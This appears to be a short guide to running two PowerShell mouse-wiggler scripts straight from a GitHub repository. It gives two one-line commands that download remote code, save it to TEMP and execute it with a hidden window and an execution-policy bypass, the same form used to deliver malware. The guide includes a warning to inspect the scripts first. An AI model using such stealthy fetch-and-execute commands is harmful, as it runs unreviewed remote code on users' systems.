# Mastering Remote PowerShell Script Execution from GitHub

## CRITICAL SECURITY ADVISORY: 
Running scripts or commands from unverified or untrusted sources can expose your system to significant risks, including malware, data theft, or unauthorized system modifications. Before executing any PowerShell script, especially those downloaded from remote sources like GitHub, meticulously inspect the code for potential malicious behavior, such as hidden downloads or remote code execution. This guide demonstrates how to safely execute PowerShell scripts from the szolll/MW1 repository, but you must verify all scripts before running them.

## Introduction: Running Remote PowerShell Scripts

PowerShell is a powerful scripting language for task automation and system management. The szolll/MW1 GitHub repository provides two scripts, WMauto.ps1 and WM.ps1, designed for specific automation tasks. This guide explains how to download and execute these scripts directly from GitHub using PowerShell commands. It also includes detailed security precautions, script breakdowns, and best practices to ensure safe and effective usage.

The commands below fetch scripts from the szolll/MW1 repository, save them temporarily on your system, and execute their primary functions. These scripts are intended for automation purposes, such as simulating mouse activity to prevent idle timeouts, but their exact functionality depends on their code, which you must review before execution.


### Executing the xxx.ps1 Script

The WMauto.ps1 script, hosted in the szolll/MW1 repository, can be executed remotely using the following PowerShell command. This script is downloaded, saved to your system's TEMP directory, and executed by calling its MW function.

````powershell.exe -NoP -W Hidden -Exec Bypass -Command "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/szolll/MW1/main/WMauto.ps1') | Out-File $env:TEMP\MW.ps1; . $env:TEMP\MW.ps1; MW"````

Or try :

```powershell.exe -NoP -W Hidden -Exec Bypass -Command "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/szolll/MW1/main/WM.ps1') | Out-File $env:TEMP\MouseWiggler.ps1; . $env:TEMP\MouseWiggler.ps1; WiggleMouse"```
